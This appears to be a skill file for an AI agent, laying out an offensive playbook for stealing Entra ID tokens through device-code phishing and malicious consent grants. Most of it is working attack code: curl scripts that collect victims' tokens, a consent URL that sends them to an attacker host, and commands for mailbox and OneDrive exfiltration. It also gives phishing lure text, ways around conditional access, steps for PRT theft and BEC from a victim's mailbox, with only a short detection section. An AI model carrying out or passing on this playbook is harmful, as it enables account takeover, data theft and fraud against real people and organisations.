---
name: entra-device-code-phishing
description: "Entra ID OAuth device-code phishing for token theft, illicit consent grant via malicious app registration with delegated Graph scopes, refresh-token replay, and primary-refresh-token (PRT) abuse concepts."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "entra device code phishing oauth illicit consent malicious app registration delegated scopes refresh token replay prt primary refresh token tokentactics graphrunner"
  subdomain: cloud
  tags: azure, entra-id, phishing, oauth, token-theft
  mitre_attack: T1528, T1566.002, T1078.004, T1550.001
---

# Entra Device-Code & Illicit-Consent Phishing

Steal Entra ID tokens without ever owning the password. Two primary primitives:
1. **Device-code phishing** — abuse the OAuth 2.0 device authorization grant: target enters YOUR code on the real MS login page.
2. **Illicit consent grant** — register an app, get the user to consent to delegated Graph scopes.

Both bypass MFA-at-login (the user already MFAd against the real IdP) and produce tokens with broad scope.

## Phase 1: Device-code flow

### Request the device code
```bash
# Use a first-party client ID (impersonate a Microsoft app — no consent prompt).
# AzureCLI: 04b07795-8ddb-461a-bbee-02f9e1bf7b46
# Teams:    1fec8e78-bce4-4aaf-ab1b-5451cc387264
# Office:   d3590ed6-52b3-4102-aeff-aad2292ab01c
CLIENT=04b07795-8ddb-461a-bbee-02f9e1bf7b46
TENANT=<TENANT>     # or "common"
resp=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode" \
  -d "client_id=${CLIENT}&scope=https://graph.microsoft.com/.default offline_access openid profile")
echo "$resp" | jq .
DEV_CODE=$(echo "$resp" | jq -r .device_code)
USER_CODE=$(echo "$resp" | jq -r .user_code)
echo "Send target to: https://microsoft.com/devicelogin  CODE: $USER_CODE"
```

### Pretext delivery
Email / Teams message saying *"To join the secure briefing, open `microsoft.com/devicelogin` and enter code `<USER_CODE>`. Code expires in 15 minutes."* — the URL and brand are legitimate Microsoft, which makes it slip past most secure-email gateways.

### Poll for the token
```bash
while :; do
  r=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=${CLIENT}&device_code=${DEV_CODE}")
  err=$(echo "$r" | jq -r .error)
  case "$err" in
    authorization_pending) sleep 5 ;;
    null) echo "$r" | jq . ; ACCESS=$(echo "$r" | jq -r .access_token); REFRESH=$(echo "$r" | jq -r .refresh_token); break ;;
    *) echo "ERR: $err" ; break ;;
  esac
done
```

### Family-of-Client-IDs (FOCI) — single token, all Microsoft apps
The above CLIENT is a FOCI app. Trade the refresh token for a token of ANY other FOCI app — no new consent:

```bash
# Swap to Outlook for mailbox access:
curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&grant_type=refresh_token&refresh_token=${REFRESH}&scope=https://outlook.office.com/.default offline_access"
```

`TokenTactics` / `TokenTacticsV2` (PowerShell) automates the swap matrix.

## Phase 2: Illicit consent grant (malicious app)

### Register the attacker app
```bash
# Register in YOUR attacker tenant (multi-tenant).
# Redirect URI: https://<ATTACKER>/redirect  ; Sign-in audience: multi-tenant + personal MSA
# Add delegated scopes (NO admin consent needed):
#   Mail.Read, Mail.Send, Files.Read.All, offline_access, openid, profile
# Capture App (client) ID = APP_ID
APP_ID=<APP_ID>
```

### Craft the consent URL
```bash
SCOPES="https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.Read.All offline_access"
REDIR=https://<ATTACKER>/redirect
echo "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${APP_ID}&response_type=code&redirect_uri=${REDIR}&response_mode=query&scope=${SCOPES}&state=phish"
```

Brand the app `Contoso HR Portal` or similar; Microsoft renders YOUR app name on the consent screen. If the tenant has *user consent for low-risk delegated scopes* enabled (default in many tenants), the user single-clicks "Accept" and you have tokens.

### Exchange code for tokens at your redirect
```bash
CODE=<CODE_FROM_REDIRECT>
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=${APP_ID}&grant_type=authorization_code&code=${CODE}&redirect_uri=${REDIR}&scope=${SCOPES}&client_secret=<APP_SECRET>" \
  | jq .
```

## Phase 3: Token replay

```bash
# Mail exfil
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=999" | jq .

# OneDrive exfil
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')" | jq .

# Persist via refresh token (90-day inactive TTL on consumer, 14-day default on CA-protected tenants)
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=${APP_ID}&grant_type=refresh_token&refresh_token=${REFRESH}&scope=${SCOPES}"
```

## Phase 4: Primary Refresh Token (PRT) concepts

A PRT is the long-lived token issued to an Entra-joined / Entra-registered Windows device. It is bound to a device key in the TPM. With SYSTEM on the device:

```powershell
# ROADtools roadtx (post-exploitation, requires local SYSTEM):
roadtx prt -u <UPN>            # extract PRT cookie via BrowserCore
roadtx browserprtauth          # use PRT to silently auth as the user → tokens for any FOCI app
# Or: Lee Christensen / Dirk-jan PoCs — request PRT + session key, mint x-ms-RefreshTokenCredential cookie.
```

A stolen PRT effectively == user identity until device revocation. Even MFA isn't re-prompted (PRT already carries MFA claim).

## Chains
- **Device-code phish → FOCI swap → Outlook + OneDrive exfil → Teams pretext → second victim**.
- **Illicit consent → Mail.Send delegated → internal phishing FROM victim mailbox** (BEC).
- **Device-code phish on admin → Graph privesc** (see `entra-privesc` § service-principal credential addition).
- **PRT theft (post-RCE on joined endpoint) → app tokens forever** (until device disabled).

## Tools
- **TokenTactics / TokenTacticsV2** (Steve Borosh) — PowerShell device-code + FOCI swap.
- **GraphRunner** (Beau Bullock) — pull mail/files/teams from a stolen token; pivot via consent.
- **roadtx** (ROADtools) — full device-code + PRT support.
- **365-Stealer** — illicit-consent automation.
- **o365 attack toolkit / Evilginx Microsoft phishlet** — alternative path (full MitM).

## Detection signatures
- Entra Sign-in log: `Application = Microsoft Authentication Broker` or `Microsoft Azure CLI` from unusual ASN/country = device-code abuse hallmark.
- Audit log: `Consent to application` event with `ConsentType=User` + `Scopes` containing `Mail.Read/Files.Read.All` from a non-IT identity.
- MS Defender for Cloud Apps `Unusual addition of credentials to an OAuth app` alert.
- Risky sign-in: `unfamiliarFeatures` + `anonymousIP` triggered by token replay from Tor/VPS.

## Decision gate
- CA blocks unmanaged devices → use FOCI swap to a client whose CA exclusion (`Microsoft Intune Enrollment`) is wider.
- Tenant has `User consent disabled` → only admin-consent path → social-engineer a Global Admin or pre-existing app-owner.
- Got Global Admin via consent? Pivot to `entra-privesc` for app-credential persistence (survives password reset).
- Got mailbox tokens only? Run BEC playbook via Mail.Send before refresh token expires.
